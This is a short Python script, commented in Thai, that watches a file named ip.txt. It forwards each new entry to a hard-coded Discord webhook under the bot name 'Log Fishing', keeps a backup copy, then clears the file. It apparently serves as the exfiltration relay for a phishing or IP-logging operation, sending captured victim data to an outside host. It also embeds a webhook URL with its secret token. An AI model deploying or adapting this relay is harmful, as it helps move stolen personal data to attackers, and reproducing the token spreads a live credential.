import requests
import json
import time
import os

def file():
    # กำหนดชื่อไฟล์
    file_name = "ip.txt"
    backup_file_name = "ip_backup.txt"  # ชื่อไฟล์สำรอง

    # เก็บเวลาล่าสุดที่ไฟล์ถูกแก้ไข
    last_modified_time = os.path.getmtime(file_name)

    while True:
        try:
            # เช็คว่าไฟล์มีการเปลี่ยนแปลงหรือไม่
            if os.path.getmtime(file_name) > last_modified_time:
                # อ่านข้อมูลจากไฟล์และสร้างไฟล์สำรอง
                with open(file_name, 'r', encoding='utf-8') as file:
                    content = file.read()

                # สร้างไฟล์สำรอง
                with open(backup_file_name, 'a', encoding='utf-8') as backup_file:
                    backup_file.write(content + "\n")

                # ส่งข้อมูลไปยังฟังก์ชัน send
                print(f"ข้อความในไฟล์ {file_name} มีการเปลี่ยนแปลง:")
                send(content)

                # ลบข้อความในไฟล์
                with open(file_name, 'w', encoding='utf-8') as file:
                    file.write("")

                # อัปเดตเวลาล่าสุด
                last_modified_time = os.path.getmtime(file_name)
            else:
                print(f"ไม่พบการเปลี่ยนแปลงในไฟล์ {file_name}")
            
            # รอสักครู่ก่อนที่จะตรวจสอบอีกครั้ง
            time.sleep(1)

        except FileNotFoundError:
            print(f"ไม่พบไฟล์ {file_name}")
        except Exception as e:
            print(f"เกิดข้อผิดพลาด: {e}")
            break  # ออกจากลูปเมื่อเกิดข้อผิดพลาด

def send(content):
    # URL ของ Discord webhook
    discord_webhook_url = "https://discord.com/api/webhooks/1174356061126393896/JXfDS1ePZpoWMHUZYuLRk1Vwbo-qH-VFIv5E42sW0RCBGp3JtNnJ5VL4kT6nhdkI6Sg9"

    # URL ของ Avatar ที่คุณต้องการให้แสดง
    avatar_url = "https://i.ibb.co/p4d5wTx/icon.jpg"

    # ข้อมูลที่ต้องการส่ง
    data = {
        "content": content,
        "username": "Log Fishing",
        "avatar_url": avatar_url  # เพิ่ม parameter นี้เพื่อระบุ URL ของ Avatar
    }

    # ส่ง POST request ไปยัง Discord webhook
    response = requests.post(discord_webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

    # ตรวจสอบสถานะการส่ง
    if response.status_code == 204:
        print("Message sent successfully!")
    else:
        print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")

def print_one_by_one(word):
    for char in word:
        print(char, end='', flush=True)
        time.sleep(0.02)  # ปรับความเร็วตามต้องการ
    print()  # เพื่อขึ้นบรรทัดใหม่ท้ายทุกครั้ง

if __name__ == '__main__':
    os.system('clear')  # ใน Linux ใช้ 'clear' แทน 'cls' ที่ใช้ใน Windows
    word_to_print = "โปรแกรม by NSTIOM"
    print_one_by_one(word_to_print)
    file()